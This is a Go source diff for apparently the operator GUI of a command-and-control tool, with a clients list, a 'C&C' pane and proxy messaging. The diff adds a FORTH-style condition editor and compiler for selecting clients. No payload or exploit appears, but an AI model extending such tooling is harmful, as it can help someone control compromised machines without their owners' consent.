@@ -3,6 +3,7 @@ package main
 import (
 	"example.com/itsuMain/lib/message"
 	"example.com/itsuMain/lib/util"
+	"example.com/itsuMain/lib/vm"
 	"fmt"
 	g "github.com/AllenDang/giu"
 	"image"
@@ -24,7 +25,24 @@ var (
 	texLinux   *image.RGBA
 	texMac     *image.RGBA
 	texUnk     *image.RGBA
+
+	conditionEditor       *g.CodeEditorWidget
+	lastCompileError      error = nil
+	lastCompilerErrorDate       = time.Now()
+	builtProgram          vm.BuiltProgram
 )
+
+func init() {
+	conditionEditor = g.CodeEditor().
+		ShowWhitespaces(false).
+		TabSize(2).
+		Text(`CNUM_const0 1 CMP >=
+CNUM_const0 3 CMP <=
+AND
+"asdasdasd" CSTR_const1 CMP ==
+OR
+HLT`).Size(0, 120)
+}
 
 func init() {
 	var (
@@ -128,12 +146,12 @@ func guiClientsList() *g.TableWidget {
 
 	return g.Table().
 		Columns(
-			g.TableColumn("Sel").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(fontSize*3),
-			g.TableColumn("ID").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(fontSize*20),
-			g.TableColumn("Address").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(fontSize*20),
-			g.TableColumn("Secs").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(fontSize*4),
-			g.TableColumn("CPU").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(fontSize*3),
-			g.TableColumn("OS").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(fontSize*2),
+			g.TableColumn("Sel").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*3),
+			g.TableColumn("ID").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*20),
+			g.TableColumn("Address").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*20),
+			g.TableColumn("Secs").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*4),
+			g.TableColumn("CPU").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*3),
+			g.TableColumn("OS").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*2),
 		).
 		Freeze(0, 1).
 		Rows(rows...)
@@ -187,28 +205,26 @@ func guiClientInformation() *g.TableWidget {
 
 func guiProxyConditions() g.Layout {
 	return g.Layout{
-		g.Row(
-			g.Label("Go runtime processor cores"),
-			g.InputInt(&proxyConditions.RTCPU).Size(32.),
-			g.InputInt(&CondRTCPU).Size(fontSize*2)),
-		g.Row(
-			g.Label("CPUID processor cores"),
-			g.InputInt(&proxyConditions.CPUIDCPU).Size(32.),
-			g.InputInt(&CondCPUIDCPU).Size(fontSize*2)),
-		g.Row(
-			g.Label("GOOS"),
-			g.InputText(&proxyConditions.GOOS).Size(32.),
-			g.InputInt(&CondGOOS).Size(fontSize*2)),
-		g.Row(
-			g.Label("Address"),
-			g.InputText(&proxyConditions.Address),
-			g.InputInt(&CondAddr).Size(fontSize*2)),
+		conditionEditor,
+		g.Button("Compile").OnClick(func() {
+			builder := vm.NewProgramBuilder()
+
+			if err := vm.CompileFORTH(builder, conditionEditor.GetText()); err != nil {
+				lastCompileError = err
+				lastCompilerErrorDate = time.Now()
+				return
+			}
+
+			builtProgram = builder.Build()
+
+			log.Println(builtProgram)
+		}), g.Label(fmt.Sprint("Last error: ", lastCompileError, "\ntook place at ", lastCompilerErrorDate.Format("15:04:05"))),
 	}
 }
 
 func loop() {
 	g.SingleWindow().Layout(
-		g.SplitLayout(g.DirectionHorizontal, true, 320,
+		g.SplitLayout(g.DirectionHorizontal, 320,
 			g.Layout{
 				g.Row(g.Label("Clients list"), g.Button("Toggle refreshes").OnClick(func() { state.ToggleRefreshes() }), g.Label(fmt.Sprint("Refreshing? ", state.IsRefreshing()))),
 				g.Row(
@@ -220,7 +236,7 @@ func loop() {
 				guiClientsList(),
 			},
 			g.Layout{
-				g.SplitLayout(g.DirectionVertical, true, 300, g.Layout{
+				g.SplitLayout(g.DirectionVertical, 300, g.Layout{
 					g.Row(
 						g.Label("Information Pane"),
 						g.Label("|"),
@@ -228,7 +244,7 @@ func loop() {
 					guiClientInformation(),
 				}, g.Layout{
 					g.Label("C&C"),
-					g.SplitLayout(g.DirectionHorizontal, true, 300,
+					g.SplitLayout(g.DirectionHorizontal, 300,
 						guiProxyConditions(),
 						g.Layout{
 							g.Label("Message to proxy"),
